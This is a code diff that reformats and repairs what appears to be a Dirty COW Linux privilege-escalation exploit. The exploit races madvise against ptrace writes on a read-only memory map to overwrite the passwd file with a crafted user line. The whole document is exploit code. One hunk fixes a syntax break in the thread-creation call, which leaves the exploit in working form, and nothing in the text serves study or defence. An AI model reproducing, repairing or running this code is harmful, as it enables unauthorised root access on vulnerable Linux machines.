@@ -67,17 +67,12 @@ char *generate_password_hash(char *plaintext_pw) {
 }
 
 char *generate_passwd_line(struct Userinfo u) {
-
   const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
-
   int size = snprintf(NULL, 0, format, u.username, u.hash,
     u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-
   char *ret = malloc(size + 1);
-
   sprintf(ret, format, u.username, u.hash, u.user_id,
     u.group_id, u.info, u.home_dir, u.shell);
-    
   return ret;
 }
 
@@ -92,7 +87,8 @@ void *madviseThread(void *arg) {
 int copy_file(const char *from, const char *to) {
   // check if target file already exists
   if(access(to, F_OK) != -1) {
-    printf("File %s already exists! Please delete it and run again\n", to);
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
     return -1;
   }
 
@@ -154,7 +150,12 @@ int main(int argc, char *argv[])
 
   f = open(filename, O_RDONLY);
   fstat(f, &st);
-  map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, f, 0);
+  map = mmap(NULL,
+             st.st_size + sizeof(long),
+             PROT_READ,
+             MAP_PRIVATE,
+             f,
+             0);
   printf("mmap: %lx\n",(unsigned long)map);
   pid = fork();
   if(pid) {
@@ -163,8 +164,12 @@ int main(int argc, char *argv[])
     int l=strlen(complete_passwd_line);
     for(i = 0; i < 10000/l; i++) {
       for(o = 0; o < l; o++) {
-        for(u = 0; u < 10000; u++)
-          c += ptrace(PTRACE_POKETEXT, pid, map + o, *((long*)(complete_passwd_line + o)));
+        for(u = 0; u < 10000; u++) {
+          c += ptrace(PTRACE_POKETEXT,
+                      pid,
+                      map + o,
+                      *((long*)(complete_passwd_line + o)));
+        }
       }
     }
     printf("ptrace %d\n",c);
@@ -172,8 +177,7 @@ int main(int argc, char *argv[])
   else {
     pthread_create(&pth,
                    NULL,
-                   madvise      }
-Thread,
+                   madviseThread,
                    NULL);
     ptrace(PTRACE_TRACEME);
     kill(getpid(), SIGSTOP);
